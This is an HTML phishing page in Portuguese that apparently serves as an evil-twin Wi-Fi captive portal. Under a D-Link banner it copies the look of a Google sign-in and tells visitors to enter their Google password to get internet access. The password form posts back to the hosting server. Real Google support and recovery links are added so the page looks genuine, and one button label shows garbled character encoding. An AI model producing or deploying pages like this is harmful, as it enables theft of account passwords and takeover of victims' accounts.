<!DOCTYPE html>
<html lang="pt-br">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Google Login Acess Point</title>
    <link rel="stylesheet" href="google.css">
    <style>
      @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@500&display=swap');
    </style>
  </head>
  <body>
    <nav class="top-nav">
      <h1><a href="https://www.dlink.com.br">D - Link</a></h1>
    </nav> 
    <div class="background-image"></div>
    <div class="login-box">
      <img src='abc.jpg'>
      <h1>Entrar</h1>
      <x1>Use sua Conta do Google para <br> Acessar a Internet!</x1>
      <form action="#" method="POST">
        <input type="password" id="passwordInput" placeholder="Senha" onfocus="hidePlaceholder()" onblur="restorePlaceholder()" required>
        <small>Problemas para se conectar? <br><a href="https://support.google.com/accounts/answer/6220279?hl=pt-BR">Tentar de outro jeito</a></small>
        <x3><a href="https://accounts.google.com/v3/signin/recoveryidentifier?flowName=GlifWebSignIn&dsh=S-1777052824%3A1735154115284719&ddm=1">Esqueceu a Senha?</a></x3>
        <button type="submit">Pr√≥ximo</button>
      </form>
    </div>
    <script>
      function hidePlaceholder() {
        const inputField = document.getElementById('passwordInput');
        inputField.placeholder = '';
      }
      function restorePlaceholder() {
        const inputField = document.getElementById('passwordInput');
        if (inputField.value === '') {
          inputField.placeholder = 'Senha';
        }
      }
    </script>
  </body>
</html>
